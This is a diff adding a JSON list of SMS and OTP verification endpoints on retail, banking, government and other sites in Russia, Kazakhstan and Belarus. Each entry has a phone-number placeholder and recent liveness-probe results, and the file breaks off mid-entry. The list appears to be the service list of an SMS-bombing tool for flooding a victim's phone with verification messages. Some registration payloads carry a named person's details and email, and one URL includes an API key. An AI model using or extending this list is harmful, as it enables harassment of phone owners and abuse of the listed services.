@@ -1,0 +1,4621 @@
+[
+  {
+    "id": "sms-c-001",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://4lapy.ru/api/auth/newCode/"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+structured",
+      "response": "{\"error\":\"{\\\"phone\\\":\\\"Введён некорректный телефон. Пример: +7 999 999 99 99\\\"}\"}"
+    }
+  },
+  {
+    "id": "sms-c-002",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://svoefermerstvo.ru/api/ext/rshb-auth/send-verification-code-auth"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 500,
+      "why": "http:500+structured",
+      "response": "{\"code\":500,\"result\":\"Invalid login provided!\"}"
+    }
+  },
+  {
+    "id": "sms-c-004",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.lifemart.ru/api/info/settings"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"present_pack\":{\"is_enabled\":true,\"price\":49,\"title\":\"Упаковать заказ как подарок 49 ₽\"},\"gift_certificate\":{\"enabled\":false,\"site_url\":\"https:\\/\\/lifemart.ru\\/certs\"},\"constants\":{\"category_ids\":{\"R"
+    }
+  },
+  {
+    "id": "sms-c-005",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://parking.spb.ru/api/graphql",
+        "headers": {
+          "Content-Type": "application/json; charset=utf-8",
+          "X-APOLLO-OPERATION-NAME": "verificationCodeRequest"
+        },
+        "json": {
+          "operationName": "verificationCodeRequest",
+          "variables": {
+            "params": {
+              "action": "SIGN_IN",
+              "subject": "{phone}",
+              "subjectType": "PHONE"
+            }
+          },
+          "query": "mutation verificationCodeRequest($params: VerificationCodeInput!) { verificationCodeRequest(params: $params) { delay success __typename } }"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"data\":{\"verificationCodeRequest\":{\"__typename\":\"VerificationCodeResult\",\"delay\":59,\"success\":true}}}"
+    }
+  },
+  {
+    "id": "sms-c-013",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      77
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://chocofood.kz/gateway/user/v2/code/"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 520,
+      "why": "http:520+structured",
+      "response": "{\"type\":\"https://developers.cloudflare.com/support/troubleshooting/http-status-codes/cloudflare-5xx-errors/error-520/\",\"title\":\"Error 520: Web server is returning an unknown error\",\"status\":520,\"detai"
+    }
+  },
+  {
+    "id": "sms-c-014",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      77
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://sso.mycar.kz/auth/login/",
+        "data": {
+          "phone_number": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"message\":\"success\"}"
+    }
+  },
+  {
+    "id": "sms-c-019",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      77
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://id.kolesa.kz/getInfoAuth.json"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+structured",
+      "response": "{\"status\":\"error\",\"code\":\"000\",\"message\":\"Неизвестный проект \\\"no-data\\\"\"}"
+    }
+  },
+  {
+    "id": "sms-c-021",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      375
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://shop.milavitsa.by/api/accounts/signUp",
+        "json": {
+          "phone": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 500,
+      "why": "http:500+structured",
+      "response": "{\"error\":{\"statusCode\":500,\"message\":\"Internal Server Error\"}}"
+    }
+  },
+  {
+    "id": "sms-c-022",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      375
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://e-zoo.by/local/gtools/login/",
+        "data": {
+          "phone": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"STATUS\":\"PERSONAL_DATA\",\"MESSAGE\":\"\\u041d\\u0435\\u0442 \\u0441\\u043e\\u0433\\u043b\\u0430\\u0441\\u0438\\u044f \\u043d\\u0430 \\u043e\\u0431\\u0440\\u0430\\u0431\\u043e\\u0442\\u043a\\u0443 \\u043f\\u0435\\u0440\\u0441\\u0"
+    }
+  },
+  {
+    "id": "sms-c-027",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      375
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://delivio.by/be/api/register",
+        "json": {
+          "phone": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 201,
+      "why": "http:201",
+      "response": "{\"id\":3237974}"
+    }
+  },
+  {
+    "id": "bsl-elmarket",
+    "name": "Elmarket",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      375
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.elmarket.by/public/ajax/sms_reg.php",
+        "params": {
+          "phone": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"status\":\"error\",\"text\":\"Некорректный номер телефона\"}"
+    }
+  },
+  {
+    "id": "sms-c-035",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      375
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://woodman.by/resource/themes/woodman/action/login/verify.php?register=true"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "ok_empty",
+      "status": 200,
+      "why": "http:200",
+      "response": "true"
+    }
+  },
+  {
+    "id": "sms-c-036",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      77
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://login.bilimland.kz/api/v1/registration",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "phone": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 422,
+      "why": "http:422+structured",
+      "response": "{\"message\":\"The given data was invalid.\",\"errors\":{\"phone\":[\"\\u04b0\\u044f\\u043b\\u044b \\u0442\\u0435\\u043b\\u0435\\u0444\\u043e\\u043d \\u043d\\u04e9\\u043c\\u0456\\u0440\\u0456 \\u04b1\\u044f\\u0448\\u044b\\u0493\\u04"
+    }
+  },
+  {
+    "id": "sms-c-054",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://id.t-bank-app.ru/auth/authorize"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+request-rejected",
+      "response": "{\"error\":\"unauthorized_client\",\"error_description\":\"There is no client by client_id\",\"error_uri\":\"https://tools.ietf.org/html/rfc6749#section-4.1.2.1\"}"
+    }
+  },
+  {
+    "id": "sms-c-077",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://lk.dune-hd.tv/v2/otps"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+structured",
+      "response": "{\"detail\":{\"phone\":[\"Обязательное поле.\"]},\"error\":{\"message\":\"Обязательное поле.\"},\"status_code\":400,\"error_code\":\"invalid\",\"readable_detail\":\"Обязательное поле.\"}"
+    }
+  },
+  {
+    "id": "sms-c-092",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.papajohns.ru/v2/user/signup-by-phone"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+request-rejected",
+      "response": "{\"success\":false,\"message\":\"Город не найден\",\"status\":400}"
+    }
+  },
+  {
+    "id": "sms-c-094",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      77
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://cabinet.creditbar.kz/rest/auth/send_sms"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 422,
+      "why": "http:422+structured",
+      "response": "{\"message\":\"\\u041f\\u043e\\u043b\\u0435 '\\u0422\\u0435\\u043b\\u0435\\u0444\\u043e\\u043d' \\u043e\\u0431\\u044f\\u0437\\u0430\\u0442\\u0435\\u043b\\u044c\\u043d\\u043e \\u0434\\u043b\\u044f \\u0437\\u0430\\u043f\\u043e\\u043b\\u"
+    }
+  },
+  {
+    "id": "sms-c-096",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      77
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.daryn.online/api/v1/users/register/send-code",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "phone": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 422,
+      "why": "http:422+structured",
+      "response": "{\"message\":\"validation.regex\",\"errors\":{\"phone\":[\"validation.regex\"]}}"
+    }
+  },
+  {
+    "id": "sms-c-097",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      77
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.korzinavdom.kz/client/auth/check"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"error\":{\"type\":\"HttpRequestMethodNotSupportedException\",\"payload\":\"Request method 'POST' not supported\"}}"
+    }
+  },
+  {
+    "id": "sms-c-099",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      77
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://appteka.kz/api/customers/otp",
+        "data": {
+          "phone": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 415,
+      "why": "http:415+structured",
+      "response": "{\"type\":\"about:blank\",\"title\":\"Unsupported Media Type\",\"status\":415,\"detail\":\"Content-Type 'application/x-www-form-urlencoded;charset=UTF-8' is not supported.\",\"instance\":\"/customers/otp\"}"
+    }
+  },
+  {
+    "id": "sms-c-100",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      77
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://zerde24.kz/api/login"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 422,
+      "why": "http:422+structured",
+      "response": "{\"message\":\"The phone field is required.\",\"errors\":{\"phone\":[\"The phone field is required.\"]}}"
+    }
+  },
+  {
+    "id": "sms-c-106",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.estelle.ru/api/v2/auth/login"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 422,
+      "why": "http:422+structured",
+      "response": "{\"message\":\"The phone field is required.\",\"errors\":{\"phone\":[\"The phone field is required.\"]}}"
+    }
+  },
+  {
+    "id": "sms-c-110",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://customer-api-gateway-prod.rbtdigitalmobile.ru/auth/token",
+        "data": {
+          "client_id": "anonymous",
+          "grant_type": "password",
+          "response_type": "code"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"access_token\":\"eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJ3Njlqb0t6WDRrZkI4VEdUd0NRTmhwWWJqZld2N3kteUFVREZPd1NqUzE0In0.eyJleHAiOjE4MjMzNTc5ODcsImlhdCI6MTc5MTgyMTk4NywianRpIjoiYzk4ZTllNGYtMWR"
+    }
+  },
+  {
+    "id": "dead-b-165",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://m2.ru/api/auth-bff/api/sign-in",
+        "json": {
+          "username": "{full_phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+structured",
+      "response": "{\"message\":\"password required\",\"error\":\"Bad Request\",\"statusCode\":400}"
+    }
+  },
+  {
+    "id": "dead-b-167",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://hands.ru/graphql/batch",
+        "json": [
+          {
+            "operationName": "handsRuSendAuthSms",
+            "variables": {
+              "phone": "{full_phone}"
+            },
+            "query": "mutation+handsRuSendAuthSms({full_phone}:+String!)+{\n++sendVerificationSms(phone:{full_phone})+{\n++++isOk\n++++__typename\n++}\n}\n"
+          }
+        ]
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "[{\"data\":{\"sendVerificationSms\":{\"isOk\":false,\"__typename\":\"SendVerificationSMS\"}},\"status\":200}]"
+    }
+  },
+  {
+    "id": "dead-b-181",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.crocshop.ru/mob_auth.php?key=1",
+        "data": {
+          "phone": "{full_phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"status\":\"fail\",\"message\":\"\\u0427\\u0442\\u043e-\\u0442\\u043e \\u043f\\u043e\\u0448\\u043b\\u043e \\u043d\\u0435 \\u0442\\u0430\\u043a\"}"
+    }
+  },
+  {
+    "id": "dead-b-183",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://beloris.ru/ajax/users/send_sms_login"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"status\": \"success\", \"message\": \"Ожидайте SMS с кодом для входа\"}"
+    }
+  },
+  {
+    "id": "dead-b-196",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.demix.ru/api/auth/otp",
+        "json": {
+          "phone": "{full_phone}",
+          "communicationChannel": "CALL",
+          "recaptchaToken": ""
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 403,
+      "why": "http:403+structured",
+      "response": "{\r\n\"incidentId\" : \"96d5cff8c4d1239a0d87929586c659a0\",\r\n\"hostName\" : \"www.demix.ru\",\r\n\"request\": \"POST /api/auth/otp HTTP/1.1\",\r\n\"errorCode\" : 102,\r\n\"timeUtc\" : \"2026-10-12T19:19:24+03:00\",\r\n\"clientIp\""
+    }
+  },
+  {
+    "id": "dead-b-205",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.585zolotoy.ru/api/sms/send_code/"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+structured",
+      "response": "[{\"field\":\"phone\",\"message\":\"Обязательное поле.\",\"code\":\"required\"}]"
+    }
+  },
+  {
+    "id": "dead-b-222",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://vodnik.ru/signin/sms-request",
+        "json": {
+          "phone": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"status\":\"success\",\"phone\":\"79991234567\"}"
+    }
+  },
+  {
+    "id": "dead-b-225",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://lemurrr.ru/registration-card/registration"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+request-rejected",
+      "response": "{\"message\":\"Не корректная регистрация\"}"
+    }
+  },
+  {
+    "id": "dead-b-228",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://street-beat.ru/api/auth/code/phone/"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+request-rejected",
+      "response": "{\"error\":\"\\u0423\\u043a\\u0430\\u0436\\u0438\\u0442\\u0435 \\u0432\\u0430\\u0448 \\u0442\\u0435\\u043b\\u0435\\u0444\\u043e\\u043d\",\"success\":false,\"needCaptcha\":false,\"errors\":null}"
+    }
+  },
+  {
+    "id": "dead-b-230",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://skbfinance.ru/php/registration.php",
+        "data": {
+          "mobile_phone": "{full_phone}",
+          "surname": "Абаимова",
+          "name": "Августина",
+          "patronymic": "Абаимова",
+          "birthdate": "15.09.1993",
+          "email": "zouheir101@mail.ru",
+          "action": "get_code",
+          "uuid": "bd66e6e5-4c06-4074-acd5-283521699955"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"result\":0,\"dialog\":{\"header\":\"\\u041d\\u043e\\u043c\\u0435\\u0440 \\u0443\\u0436\\u0435 \\u0437\\u0430\\u0440\\u0435\\u0433\\u0438\\u0441\\u0442\\u0440\\u0438\\u0440\\u043e\\u0432\\u0430\\u043d\",\"message\":\"\\u041f\\u043e \\u"
+    }
+  },
+  {
+    "id": "dead-b-238",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://nskfloraopt.ru/ajax/form_processing.php"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "ok_empty",
+      "status": 200,
+      "why": "http:200",
+      "response": ""
+    }
+  },
+  {
+    "id": "dead-b-241",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://mobile-gate.chitai-gorod.ru/api/v1/auth/anonymous"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"result\":null,\"error\":true,\"hash\":\"5387c3012091460599cbaf21e9bd5837\",\"error_detail\":{\"code\":9054,\"message\":\"DeviceOS обязательное поле Platform обязательное поле Version обязательное поле\",\"type\":\"si"
+    }
+  },
+  {
+    "id": "dead-b-247",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://bill.jehost.ru/billmgr",
+        "data": {
+          "func": "register",
+          "realname": "Августина Абаимова",
+          "recaptcha_type": "3",
+          "project": "1",
+          "currency_fromsite": "126",
+          "tzoffset": "180,1",
+          "country": "182",
+          "phone": "{full_phone}",
+          "phone_country": "182",
+          "phone_state": "init",
+          "field_3": "off",
+          "field_4": "off",
+          "g-recaptcha-response": "undefined",
+          "sv_field": "phone_send_otp",
+          "out": "xjson"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"doc\":{\"$lang\":\"ru\",\"$func\":\"register\",\"$binary\":\"\\/billmgr\",\"$host\":\"https:\\/\\/bill.jehost.ru\",\"$themename\":\"dragon\",\"$features\":\"377a7a8f9ef80b08f924aa06820d5238\",\"$notify\":\"\",\"$stylesheet\":\"setval"
+    }
+  },
+  {
+    "id": "dead-b-248",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://groupprice.ru/auth_phone/send_token",
+        "data": {
+          "--c23e115a-0c8f-43d6-abb3-3bf0d81b3da1\r\nContent-Disposition: form-data; name": "\"phone\"{full_phone}\r\n--c23e115a-0c8f-43d6-abb3-3bf0d81b3da1\r\nContent-Disposition: form-data; name=\"time_zone\"\r\n\r\n180\r\n--c23e115a-0c8f-43d6-abb3-3bf0d81b3da1\r\nContent-Disposition: form-data; name=\"token\"\r\n\r\n\r\n--c23e115a-0c8f-43d6-abb3-3bf0d81b3da1\r\nContent-Disposition: form-data; name=\"otp_reader_type\"\r\n\r\nweb_otp\r\n--c23e115a-0c8f-43d6-abb3-3bf0d81b3da1--\r\n"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "ok_empty",
+      "status": 200,
+      "why": "http:200",
+      "response": ""
+    }
+  },
+  {
+    "id": "dead-b-249",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://krd.split-nastroi.ru/api/Cabinet/sendCode",
+        "data": {
+          "form[status]": "client",
+          "form[phone]": "{full_phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"success\":true,\"message\":\"\\u041a\\u043e\\u0434 \\u0432 \\u0421\\u041c\\u0421 \\u0443\\u0441\\u043f\\u0435\\u0448\\u043d\\u043e \\u043e\\u0442\\u043f\\u0440\\u0430\\u0432\\u043b\\u0435\\u043d\"}"
+    }
+  },
+  {
+    "id": "dead-b-250",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.shinservice.ru/api/phone-confirm/send.json"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+structured",
+      "response": "{\"name\":\"Bad Request\",\"message\":\"С Вашего IP адреса замечена подозрительная активность, попробуйте снова.\",\"code\":0,\"status\":400}"
+    }
+  },
+  {
+    "id": "dead-b-251",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://android.apis.google.com/c2dm/register3"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "ok_empty",
+      "status": 200,
+      "why": "http:200",
+      "response": "Error=INVALID_PARAMETERS"
+    }
+  },
+  {
+    "id": "dead-b-258",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://spb.simplymeal.ru/rest/customer/auth/"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+structured",
+      "response": "{\"message\":{\"badParameters\":{\"step\":{\"required\":true},\"phone\":{\"required\":true},\"deviceUuid\":{\"required\":true}}}}"
+    }
+  },
+  {
+    "id": "dead-b-271",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.585zolotoy.ru/api/sms/send_code/"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+structured",
+      "response": "[{\"field\":\"phone\",\"message\":\"Обязательное поле.\",\"code\":\"required\"}]"
+    }
+  },
+  {
+    "id": "dead-b-273",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.sunlight.net/modules/customer-auth/v1/app/send/"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"status\":{\"code\":400,\"success\":\"0\"},\"errors\":{\"detail\":[\"Некорректный номер\"]},\"errors_list\":[\"Некорректный номер\"]}"
+    }
+  },
+  {
+    "id": "dead-b-274",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://mir.hyundai.ru/rest/hyundai-id/code/send"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 422,
+      "why": "http:422+structured",
+      "response": "[{\"field\":\"type\",\"message\":\"Необходимо заполнить «Type».\"},{\"field\":\"username\",\"message\":\"Необходимо заполнить «Username».\"},{\"field\":\"captcha\",\"message\":\"Необходимо заполнить «Captcha».\"}]"
+    }
+  },
+  {
+    "id": "dead-b-276",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://retail-kb.kbapp.ru/api/v1/users/registration/"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 426,
+      "why": "http:426+structured",
+      "response": "{\"success\":false,\"result\":[],\"error\":{\"code\":10000,\"message\":\"\\u041e\\u0431\\u043d\\u043e\\u0432\\u0438\\u0442\\u0435 \\u043f\\u0440\\u0438\\u043b\\u043e\\u0436\\u0435\\u043d\\u0438\\u0435\"}}"
+    }
+  },
+  {
+    "id": "dead-b-278",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.start.ru/auth/device/login?apikey=a20b12b279f744f2b3c7b5c5400c4eb5"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+structured",
+      "response": "{\"code\":\"VALIDATION_ERROR\",\"detail\":[{\"type\":\"missing\",\"loc\":[\"body\"],\"msg\":\"Field required\",\"input\":null}]}"
+    }
+  },
+  {
+    "id": "dead-b-280",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.comfortkino.ru/app/devicetoken"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 405,
+      "why": "http:405+structured",
+      "response": "{\"status\":\"error\",\"error\":{\"code\":4,\"message\":\"\\u041c\\u0435\\u0442\\u043e\\u0434 \\u043d\\u0435 \\u043d\\u0430\\u0439\\u0434\\u0435\\u043d.\"}}"
+    }
+  },
+  {
+    "id": "dead-b-282",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://lk.sogaz.ru/api/v1/register/phone"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 422,
+      "why": "http:422+request-rejected",
+      "response": "[{\"description\":\"\\u041d\\u0435\\u043e\\u0431\\u0445\\u043e\\u0434\\u0438\\u043c\\u043e \\u043e\\u0431\\u043d\\u043e\\u0432\\u0438\\u0442\\u044c \\u043f\\u0440\\u0438\\u043b\\u043e\\u0436\\u0435\\u043d\\u0438\\u0435\"}]"
+    }
+  },
+  {
+    "id": "dead-b-286",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.citydrive.ru/signup",
+        "headers": {
+          "Content-Type": "application/json; charset=utf-8"
+        },
+        "json": {
+          "os": "web",
+          "phone": "{phone}",
+          "phone_code": "7",
+          "vendor_id": "{uuid}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"step\":\"sms\",\"phone\":\"79991234567\",\"success\":true}"
+    }
+  },
+  {
+    "id": "dead-b-293",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      380
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.staff-clothes.com/api/v1/send-sms-code"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+structured",
